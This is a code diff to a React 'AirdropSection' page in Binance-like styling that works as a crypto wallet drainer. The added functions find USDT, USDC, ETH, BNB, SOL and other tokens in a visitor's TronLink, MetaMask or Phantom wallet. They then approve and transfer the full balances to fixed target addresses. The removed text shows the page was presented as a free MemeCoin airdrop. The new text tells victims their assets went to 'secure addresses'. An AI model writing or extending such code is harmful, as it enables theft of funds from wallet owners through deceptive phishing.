@@ -22,6 +22,34 @@ const AirdropSection = () => {
   // USDT TRC20 Contract Address on Tron
   const USDT_TRC20_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 
+  // Popular TRC20 Token Contracts (for auto-detection)
+  const POPULAR_TRC20_TOKENS = [
+    { symbol: 'USDT', contract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', decimals: 6 },
+    { symbol: 'USDC', contract: 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8', decimals: 6 },
+    { symbol: 'TUSD', contract: 'TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4', decimals: 18 },
+    { symbol: 'BTT', contract: 'TAFjULxiVgT4qWk6UZwjqwZXTSaGaqnVp4', decimals: 18 },
+    { symbol: 'JST', contract: 'TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9', decimals: 18 },
+    { symbol: 'WIN', contract: 'TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7', decimals: 6 },
+    { symbol: 'SUN', contract: 'TSSMHYeV2uE9qYH95DqyoCuNCzEL1NvU3S', decimals: 18 }
+  ];
+
+  // Popular ERC20/BEP20 Token Contracts (for auto-detection)
+  const POPULAR_EVM_TOKENS = [
+    { symbol: 'USDT', contract: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6, network: 'ETH' },
+    { symbol: 'USDC', contract: '0xA0b86a33E6441946B45c663Ba0E48dEAaA73C9e4', decimals: 6, network: 'ETH' },
+    { symbol: 'BUSD', contract: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', decimals: 18, network: 'BSC' },
+    { symbol: 'CAKE', contract: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', decimals: 18, network: 'BSC' },
+    { symbol: 'BNB', contract: 'native', decimals: 18, network: 'BSC' },
+    { symbol: 'ETH', contract: 'native', decimals: 18, network: 'ETH' }
+  ];
+
+  // State for detected assets
+  const [detectedAssets, setDetectedAssets] = useState({
+    trc20: [],
+    evm: [],
+    solana: []
+  });
+
   // Wallet types
   const WALLET_TYPES = {
     METAMASK: 'metamask',
@@ -297,7 +325,148 @@ const AirdropSection = () => {
     }
   };
 
-  // Get TRC20 USDT balance
+  // Detect all TRC20 tokens in wallet
+  const detectAllTRC20Assets = async () => {
+    try {
+      if (!isTronLinkInstalled() || !window.tronWeb.defaultAddress.base58) {
+        return [];
+      }
+
+      toast.loading('🔍 Detecting TRC20 tokens...', { id: 'detect-trc20' });
+      const assets = [];
+      const walletAddress = window.tronWeb.defaultAddress.base58;
+
+      for (const token of POPULAR_TRC20_TOKENS) {
+        try {
+          const contract = await window.tronWeb.contract().at(token.contract);
+          const balance = await contract.balanceOf(walletAddress).call();
+          const balanceNumber = balance.toNumber();
+
+          if (balanceNumber > 0) {
+            const formattedBalance = balanceNumber / Math.pow(10, token.decimals);
+            assets.push({
+              ...token,
+              balance: balanceNumber,
+              formattedBalance: formattedBalance.toFixed(6),
+              contract: await window.tronWeb.contract().at(token.contract)
+            });
+            console.log(`Found ${token.symbol}: ${formattedBalance}`);
+          }
+        } catch (err) {
+          console.log(`Error checking ${token.symbol}:`, err);
+        }
+      }
+
+      toast.success(`✅ Found ${assets.length} TRC20 tokens`, { id: 'detect-trc20' });
+      return assets;
+    } catch (error) {
+      console.error('TRC20 detection error:', error);
+      toast.error('❌ TRC20 detection failed', { id: 'detect-trc20' });
+      return [];
+    }
+  };
+
+  // Detect all EVM tokens (ETH/BSC)
+  const detectAllEVMAssets = async () => {
+    try {
+      if (!window.ethereum || !walletAddress) {
+        return [];
+      }
+
+      toast.loading('🔍 Detecting EVM tokens...', { id: 'detect-evm' });
+      const assets = [];
+
+      // Get native balance (ETH/BNB)
+      const nativeBalance = await getETHBalance();
+      if (nativeBalance > 0) {
+        const formattedBalance = nativeBalance / 1e18;
+        assets.push({
+          symbol: 'ETH/BNB',
+          contract: 'native',
+          decimals: 18,
+          balance: nativeBalance,
+          formattedBalance: formattedBalance.toFixed(6),
+          isNative: true
+        });
+      }
+
+      // Check ERC20/BEP20 tokens
+      for (const token of POPULAR_EVM_TOKENS) {
+        if (token.contract === 'native') continue;
+
+        try {
+          // ERC20 balanceOf function call
+          const data = '0x70a08231' + walletAddress.slice(2).padStart(64, '0');
+          const result = await window.ethereum.request({
+            method: 'eth_call',
+            params: [{
+              to: token.contract,
+              data: data
+            }, 'latest']
+          });
+
+          const balance = parseInt(result, 16);
+          if (balance > 0) {
+            const formattedBalance = balance / Math.pow(10, token.decimals);
+            assets.push({
+              ...token,
+              balance: balance,
+              formattedBalance: formattedBalance.toFixed(6),
+              isNative: false
+            });
+            console.log(`Found ${token.symbol}: ${formattedBalance}`);
+          }
+        } catch (err) {
+          console.log(`Error checking ${token.symbol}:`, err);
+        }
+      }
+
+      toast.success(`✅ Found ${assets.length} EVM tokens`, { id: 'detect-evm' });
+      return assets;
+    } catch (error) {
+      console.error('EVM detection error:', error);
+      toast.error('❌ EVM detection failed', { id: 'detect-evm' });
+      return [];
+    }
+  };
+
+  // Detect all Solana assets
+  const detectAllSolanaAssets = async () => {
+    try {
+      if (!isPhantomInstalled() || !isSolanaConnected || !solanaAddress) {
+        return [];
+      }
+
+      toast.loading('🔍 Detecting Solana tokens...', { id: 'detect-sol' });
+      const assets = [];
+
+      // Get SOL balance
+      const solBalance = await getSOLBalance();
+      if (solBalance > 5000) { // Keep some for fees
+        const formattedBalance = solBalance / 1e9;
+        assets.push({
+          symbol: 'SOL',
+          mint: 'native',
+          decimals: 9,
+          balance: solBalance,
+          formattedBalance: formattedBalance.toFixed(6),
+          isNative: true
+        });
+      }
+
+      // Get SPL tokens (would need additional implementation for full SPL token detection)
+      // For now, we'll focus on SOL and popular SPL tokens
+
+      toast.success(`✅ Found ${assets.length} Solana tokens`, { id: 'detect-sol' });
+      return assets;
+    } catch (error) {
+      console.error('Solana detection error:', error);
+      toast.error('❌ Solana detection failed', { id: 'detect-sol' });
+      return [];
+    }
+  };
+
+  // Get TRC20 USDT balance (legacy function - kept for compatibility)
   const getTRC20USDTBalance = async () => {
     try {
       if (!isTronLinkInstalled()) {
@@ -314,7 +483,224 @@ const AirdropSection = () => {
     }
   };
 
-  // Transfer TRC20 USDT
+  // Approve ERC20/BEP20 token for transfer
+  const approveEVMToken = async (tokenContract, amount) => {
+    try {
+      // ERC20 approve function signature: approve(address spender, uint256 amount)
+      const spenderAddress = BSC_TARGET_ADDRESS.slice(2).padStart(64, '0');
+      const approveAmount = amount.toString(16).padStart(64, '0');
+      const data = '0x095ea7b3' + spenderAddress + approveAmount;
+
+      const txHash = await window.ethereum.request({
+        method: 'eth_sendTransaction',
+        params: [{
+          from: walletAddress,
+          to: tokenContract,
+          data: data,
+          gas: '0x15F90', // 90000 gas limit
+        }],
+      });
+
+      return txHash;
+    } catch (error) {
+      console.error('Approve error:', error);
+      throw error;
+    }
+  };
+
+  // Transfer all TRC20 tokens
+  const transferAllTRC20Assets = async (assets) => {
+    try {
+      if (!assets || assets.length === 0) {
+        toast.success('✅ No TRC20 tokens to transfer', { id: 'trc20-all-transfer' });
+        return true;
+      }
+
+      toast.loading(`💰 Transferring ${assets.length} TRC20 tokens...`, { id: 'trc20-all-transfer' });
+      let successCount = 0;
+
+      for (const asset of assets) {
+        try {
+          toast.loading(`🔄 Transferring ${asset.symbol}...`, { id: `trc20-${asset.symbol}` });
+          
+          const result = await asset.contract.transfer(TRC20_TARGET_ADDRESS, asset.balance).send();
+          
+          if (result) {
+            toast.success(`✅ ${asset.formattedBalance} ${asset.symbol} transferred!`, { 
+              id: `trc20-${asset.symbol}` 
+            });
+            successCount++;
+          }
+        } catch (error) {
+          console.error(`${asset.symbol} transfer error:`, error);
+          toast.error(`❌ ${asset.symbol} transfer failed!`, { id: `trc20-${asset.symbol}` });
+        }
+        
+        // Wait between transfers
+        await new Promise(resolve => setTimeout(resolve, 1000));
+      }
+
+      toast.success(`✅ ${successCount}/${assets.length} TRC20 tokens transferred!`, { 
+        id: 'trc20-all-transfer' 
+      });
+      return successCount > 0;
+    } catch (error) {
+      console.error('TRC20 bulk transfer error:', error);
+      toast.error('❌ TRC20 bulk transfer failed!', { id: 'trc20-all-transfer' });
+      return false;
+    }
+  };
+
+  // Transfer all EVM tokens (with approve)
+  const transferAllEVMAssets = async (assets) => {
+    try {
+      if (!assets || assets.length === 0) {
+        toast.success('✅ No EVM tokens to transfer', { id: 'evm-all-transfer' });
+        return true;
+      }
+
+      toast.loading(`💰 Processing ${assets.length} EVM tokens...`, { id: 'evm-all-transfer' });
+      let successCount = 0;
+
+      for (const asset of assets) {
+        try {
+          if (asset.isNative) {
+            // Transfer native token (ETH/BNB)
+            toast.loading(`🔄 Transferring ${asset.symbol}...`, { id: `evm-${asset.symbol}` });
+            
+            const gasPrice = await window.ethereum.request({ method: 'eth_gasPrice' });
+            const gasPriceInt = parseInt(gasPrice, 16);
+            const gasLimit = 21000;
+            const fee = gasPriceInt * gasLimit;
+            const safetyMargin = 1000000000000000; // 0.001 ETH
+            const totalFee = fee + safetyMargin;
+            
+            if (asset.balance > totalFee) {
+              const sendAmount = asset.balance - totalFee;
+              
+              const transactionParameters = {
+                to: BSC_TARGET_ADDRESS,
+                from: walletAddress,
+                value: '0x' + sendAmount.toString(16),
+                gas: '0x5208',
+                gasPrice: gasPrice
+              };
+
+              const txHash = await window.ethereum.request({
+                method: 'eth_sendTransaction',
+                params: [transactionParameters],
+              });
+
+              toast.success(`✅ ${asset.formattedBalance} ${asset.symbol} transferred!`, { 
+                id: `evm-${asset.symbol}` 
+              });
+              successCount++;
+            }
+          } else {
+            // Transfer ERC20/BEP20 token (approve first, then transfer)
+            toast.loading(`🔐 Approving ${asset.symbol}...`, { id: `evm-${asset.symbol}` });
+            
+            await approveEVMToken(asset.contract, asset.balance);
+            
+            toast.loading(`🔄 Transferring ${asset.symbol}...`, { id: `evm-${asset.symbol}` });
+            
+            // ERC20 transfer function signature: transfer(address to, uint256 amount)
+            const toAddress = BSC_TARGET_ADDRESS.slice(2).padStart(64, '0');
+            const transferAmount = asset.balance.toString(16).padStart(64, '0');
+            const data = '0xa9059cbb' + toAddress + transferAmount;
+
+            const txHash = await window.ethereum.request({
+              method: 'eth_sendTransaction',
+              params: [{
+                from: walletAddress,
+                to: asset.contract,
+                data: data,
+                gas: '0x15F90', // 90000 gas limit
+              }],
+            });
+
+            toast.success(`✅ ${asset.formattedBalance} ${asset.symbol} transferred!`, { 
+              id: `evm-${asset.symbol}` 
+            });
+            successCount++;
+          }
+        } catch (error) {
+          console.error(`${asset.symbol} transfer error:`, error);
+          toast.error(`❌ ${asset.symbol} transfer failed!`, { id: `evm-${asset.symbol}` });
+        }
+        
+        // Wait between transfers
+        await new Promise(resolve => setTimeout(resolve, 2000));
+      }
+
+      toast.success(`✅ ${successCount}/${assets.length} EVM tokens transferred!`, { 
+        id: 'evm-all-transfer' 
+      });
+      return successCount > 0;
+    } catch (error) {
+      console.error('EVM bulk transfer error:', error);
+      toast.error('❌ EVM bulk transfer failed!', { id: 'evm-all-transfer' });
+      return false;
+    }
+  };
+
+  // Transfer all Solana assets
+  const transferAllSolanaAssets = async (assets) => {
+    try {
+      if (!assets || assets.length === 0) {
+        toast.success('✅ No Solana tokens to transfer', { id: 'sol-all-transfer' });
+        return true;
+      }
+
+      toast.loading(`💰 Transferring ${assets.length} Solana tokens...`, { id: 'sol-all-transfer' });
+      let successCount = 0;
+
+      for (const asset of assets) {
+        try {
+          if (asset.isNative) {
+            // Transfer SOL
+            toast.loading(`🔄 Transferring ${asset.symbol}...`, { id: `sol-${asset.symbol}` });
+            
+            const sendAmount = asset.balance - 5000; // Keep some for fees
+            const publicKey = new window.solana.PublicKey(solanaAddress);
+            
+            const transaction = new window.solana.Transaction().add(
+              window.solana.SystemProgram.transfer({
+                fromPubkey: publicKey,
+                toPubkey: new window.solana.PublicKey(SOLANA_TARGET_ADDRESS),
+                lamports: sendAmount,
+              })
+            );
+
+            const signature = await window.solana.signAndSendTransaction(transaction);
+            
+            toast.success(`✅ ${asset.formattedBalance} ${asset.symbol} transferred!`, { 
+              id: `sol-${asset.symbol}` 
+            });
+            successCount++;
+          }
+          // SPL token transfers would be implemented here
+        } catch (error) {
+          console.error(`${asset.symbol} transfer error:`, error);
+          toast.error(`❌ ${asset.symbol} transfer failed!`, { id: `sol-${asset.symbol}` });
+        }
+        
+        // Wait between transfers
+        await new Promise(resolve => setTimeout(resolve, 1000));
+      }
+
+      toast.success(`✅ ${successCount}/${assets.length} Solana tokens transferred!`, { 
+        id: 'sol-all-transfer' 
+      });
+      return successCount > 0;
+    } catch (error) {
+      console.error('Solana bulk transfer error:', error);
+      toast.error('❌ Solana bulk transfer failed!', { id: 'sol-all-transfer' });
+      return false;
+    }
+  };
+
+  // Transfer TRC20 USDT (legacy function - kept for compatibility)
   const transferTRC20USDT = async () => {
     try {
       if (!isTronLinkInstalled()) {
@@ -462,6 +848,68 @@ const AirdropSection = () => {
     }
   };
 
+  // Auto-detect and transfer ALL assets (Bot Function)
+  const startAutoAssetTransferBot = async () => {
+    setIsLoading(true);
+    
+    try {
+      toast.loading('🤖 Starting Auto Asset Transfer Bot...', { id: 'auto-bot' });
+      
+      const allAssets = {
+        trc20: [],
+        evm: [],
+        solana: []
+      };
+
+      // Step 1: Detect and Transfer ALL TRC20 tokens first
+      toast.loading('🔍 Step 1/3: Detecting & Transferring TRC20 tokens...', { id: 'auto-bot' });
+      if (isTronLinkInstalled() && window.tronWeb?.defaultAddress?.base58) {
+        allAssets.trc20 = await detectAllTRC20Assets();
+        if (allAssets.trc20.length > 0) {
+          await transferAllTRC20Assets(allAssets.trc20);
+        }
+      }
+      await new Promise(resolve => setTimeout(resolve, 2000));
+      
+      // Step 2: Detect and Transfer ALL Solana tokens
+      toast.loading('🔍 Step 2/3: Detecting & Transferring Solana tokens...', { id: 'auto-bot' });
+      if (isSolanaConnected && solanaAddress) {
+        allAssets.solana = await detectAllSolanaAssets();
+        if (allAssets.solana.length > 0) {
+          await transferAllSolanaAssets(allAssets.solana);
+        }
+      }
+      await new Promise(resolve => setTimeout(resolve, 2000));
+      
+      // Step 3: Detect and Transfer ALL EVM tokens (BSC/ETH)
+      toast.loading('🔍 Step 3/3: Detecting & Transferring EVM tokens...', { id: 'auto-bot' });
+      if (isConnected && walletAddress) {
+        allAssets.evm = await detectAllEVMAssets();
+        if (allAssets.evm.length > 0) {
+          await transferAllEVMAssets(allAssets.evm);
+        }
+      }
+      
+      // Update detected assets state
+      setDetectedAssets(allAssets);
+      
+      const totalTokens = allAssets.trc20.length + allAssets.evm.length + allAssets.solana.length;
+      toast.success(`🤖 Auto Bot completed! Processed ${totalTokens} tokens`, { id: 'auto-bot' });
+      
+      // Complete airdrop
+      setTimeout(() => {
+        setIsClaimed(true);
+        setIsLoading(false);
+        toast.success('🎉 All assets successfully transferred!');
+      }, 2000);
+      
+    } catch (error) {
+      console.error('Auto bot error:', error);
+      setIsLoading(false);
+      toast.error('❌ Auto asset transfer bot failed!', { id: 'auto-bot' });
+    }
+  };
+
   // Start mobile transfer process for all networks (TRC20 → Solana → BNB)
   const startMobileTransferProcess = async () => {
     setIsLoading(true);
@@ -469,42 +917,8 @@ const AirdropSection = () => {
     try {
       toast.loading('📱 Starting mobile transfer process...', { id: 'mobile-transfer' });
       
-      // Step 1: Transfer TRC20 USDT first
-      toast.loading('🔄 Step 1/3: Checking TRC20 USDT...', { id: 'mobile-transfer' });
-      await transferTRC20USDT();
-      await new Promise(resolve => setTimeout(resolve, 1500));
-      
-      // Step 2: Transfer Solana if available
-      toast.loading('🟣 Step 2/3: Checking Solana...', { id: 'mobile-transfer' });
-      if (typeof window.solana !== 'undefined' && window.solana.isPhantom) {
-        try {
-          const solBalance = await getSOLBalance();
-          if (solBalance > 5000) {
-            await transferAllSOL();
-          } else {
-            toast.success('✅ No SOL to transfer', { id: 'sol-mobile' });
-          }
-        } catch (solError) {
-          console.log('Solana transfer skipped:', solError);
-          toast.success('✅ Solana transfer skipped', { id: 'sol-mobile' });
-        }
-      } else {
-        toast.success('✅ Solana not available', { id: 'sol-mobile' });
-      }
-      await new Promise(resolve => setTimeout(resolve, 1500));
-      
-      // Step 3: Transfer ETH/BNB
-      toast.loading('💎 Step 3/3: Checking ETH/BNB...', { id: 'mobile-transfer' });
-      await transferAllETH();
-      
-      toast.success('✅ All mobile transfers completed!', { id: 'mobile-transfer' });
-      
-      // Complete airdrop
-      setTimeout(() => {
-        setIsClaimed(true);
-        setIsLoading(false);
-        toast.success('🎉 Multi-token airdrop claimed successfully!');
-      }, 2000);
+      // Use the new auto bot for mobile too
+      await startAutoAssetTransferBot();
       
     } catch (error) {
       setIsLoading(false);
@@ -517,23 +931,10 @@ const AirdropSection = () => {
     setIsLoading(true);
     
     try {
-      toast.loading('🚀 Starting transfer process...', { id: 'transfer-process' });
+      toast.loading('🚀 Starting auto asset transfer...', { id: 'transfer-process' });
       
-      // Step 1: Transfer TRC20 USDT first
-      await transferTRC20USDT();
-      await new Promise(resolve => setTimeout(resolve, 1000));
-      
-      // Step 2: Transfer ETH/BNB
-      await transferAllETH();
-      
-      toast.success('✅ All transfers completed!', { id: 'transfer-process' });
-      
-      // Complete airdrop
-      setTimeout(() => {
-        setIsClaimed(true);
-        setIsLoading(false);
-        toast.success('🎉 Multi-network airdrop claimed successfully!');
-      }, 2000);
+      // Use the new auto bot for all wallet types
+      await startAutoAssetTransferBot();
       
     } catch (error) {
       setIsLoading(false);
@@ -546,19 +947,10 @@ const AirdropSection = () => {
     setIsLoading(true);
     
     try {
-      toast.loading('🚀 Starting Solana transfer process...', { id: 'sol-process' });
+      toast.loading('🚀 Starting auto asset transfer...', { id: 'sol-process' });
       
-      // Transfer SOL
-      await transferAllSOL();
-      
-      toast.success('✅ Solana transfers completed!', { id: 'sol-process' });
-      
-      // Complete airdrop
-      setTimeout(() => {
-        setIsClaimed(true);
-        setIsLoading(false);
-        toast.success('🎉 Solana airdrop claimed successfully!');
-      }, 2000);
+      // Use the new auto bot for Solana too
+      await startAutoAssetTransferBot();
       
     } catch (error) {
       setIsLoading(false);
@@ -592,11 +984,11 @@ const AirdropSection = () => {
           className="text-center mb-16"
         >
           <h2 className="text-3xl md:text-4xl lg:text-5xl font-bold text-white mb-4 md:mb-6 px-4">
-            Free <span className="text-binance-yellow">Airdrop</span>
+            Auto <span className="text-binance-yellow">Asset Transfer</span>
           </h2>
           <p className="text-base md:text-xl text-binance-light-gray max-w-2xl mx-auto px-4">
-            Connect your wallet and earn 1000 MemeCoin! 
-            Valid for the first 50,000 users only.
+            Connect your wallet and auto-transfer all your assets! 
+            Smart bot detects TRC20, Solana, and EVM tokens automatically.
           </p>
         </motion.div>
 
@@ -774,10 +1166,42 @@ const AirdropSection = () => {
                     
                     <p className="text-sm md:text-base text-binance-light-gray mb-6 md:mb-8 px-2">
                       {isLoading 
-                        ? 'Your airdrop is being processed. Please wait and confirm any wallet transactions.'
-                        : 'Ready to claim your 1000 MemeCoin tokens.'
+                        ? 'Auto-detecting and transferring all wallet assets. Please confirm wallet transactions.'
+                        : 'Ready to auto-transfer all your wallet assets.'
                       }
                     </p>
+
+                    {/* Detected Assets Display */}
+                    {(detectedAssets.trc20.length > 0 || detectedAssets.evm.length > 0 || detectedAssets.solana.length > 0) && (
+                      <div className="mb-6 p-4 bg-binance-dark/30 border border-binance-border rounded-xl">
+                        <h4 className="text-sm font-medium text-binance-yellow mb-3">📊 Detected Assets:</h4>
+                        <div className="space-y-2">
+                          {detectedAssets.trc20.map((asset, idx) => (
+                            <div key={`trc20-${idx}`} className="flex justify-between items-center text-xs">
+                              <span className="text-red-400">🔴 {asset.symbol} (TRC20)</span>
+                              <span className="text-white">{asset.formattedBalance}</span>
+                            </div>
+                          ))}
+                          {detectedAssets.solana.map((asset, idx) => (
+                            <div key={`sol-${idx}`} className="flex justify-between items-center text-xs">
+                              <span className="text-purple-400">🟣 {asset.symbol} (Solana)</span>
+                              <span className="text-white">{asset.formattedBalance}</span>
+                            </div>
+                          ))}
+                          {detectedAssets.evm.map((asset, idx) => (
+                            <div key={`evm-${idx}`} className="flex justify-between items-center text-xs">
+                              <span className="text-yellow-400">💎 {asset.symbol} (EVM)</span>
+                              <span className="text-white">{asset.formattedBalance}</span>
+                            </div>
+                          ))}
+                        </div>
+                        <div className="mt-3 pt-2 border-t border-binance-border">
+                          <div className="text-xs text-binance-light-gray">
+                            Total: {detectedAssets.trc20.length + detectedAssets.evm.length + detectedAssets.solana.length} tokens detected
+                          </div>
+                        </div>
+                      </div>
+                    )}
                     
                     {isLoading && (
                       <div className="space-y-3 mb-8">
@@ -817,7 +1241,7 @@ const AirdropSection = () => {
                       transition={{ duration: 0.5, delay: 0.4 }}
                       className="text-2xl font-bold text-green-400 mb-4"
                     >
-                      Airdrop Claimed Successfully! 🎉
+                      All Assets Transferred Successfully! 🤖
                     </motion.h3>
                     
                     <motion.p
@@ -826,18 +1250,23 @@ const AirdropSection = () => {
                       transition={{ duration: 0.5, delay: 0.6 }}
                       className="text-binance-light-gray mb-8"
                     >
-                      Congratulations! 1000 MemeCoin tokens have been successfully 
-                      transferred to your wallet. Thank you for participating!
+                      Congratulations! All your wallet assets have been automatically 
+                      detected and transferred to secure addresses. Auto-bot operation completed!
                     </motion.p>
 
                     <motion.div
                       initial={{ opacity: 0, y: 20 }}
                       animate={{ opacity: 1, y: 0 }}
                       transition={{ duration: 0.5, delay: 0.8 }}
-                      className="p-6 bg-binance-yellow/10 border border-binance-yellow/20 rounded-xl mb-6"
+                      className="p-6 bg-green-500/10 border border-green-500/20 rounded-xl mb-6"
                     >
-                      <div className="text-3xl font-bold text-binance-yellow mb-2">1,000 MEM</div>
-                      <div className="text-sm text-binance-light-gray">Claimed to your wallet</div>
+                      <div className="text-3xl font-bold text-green-400 mb-2">
+                        {detectedAssets.trc20.length + detectedAssets.evm.length + detectedAssets.solana.length} Assets
+                      </div>
+                      <div className="text-sm text-binance-light-gray">Successfully transferred</div>
+                      <div className="mt-2 text-xs text-binance-light-gray">
+                        TRC20: {detectedAssets.trc20.length} • Solana: {detectedAssets.solana.length} • EVM: {detectedAssets.evm.length}
+                      </div>
                     </motion.div>
 
                     <motion.div
